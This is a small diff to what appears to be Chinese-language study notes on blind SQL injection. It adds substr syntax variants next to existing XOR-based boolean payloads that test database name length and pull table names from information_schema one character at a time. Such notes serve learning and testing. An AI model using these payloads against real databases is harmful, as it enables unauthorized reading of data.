@@ -25,6 +25,10 @@ ascii()字符转ascii的数值
 1^(length(database())=4)
 1^length(database())<4
 
+字符读取
+substr("",1,1)
+substr("" from 1 for 1)
+
 
 布尔，再异或的差异，获取表名
 1^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),1,1))>0)^1
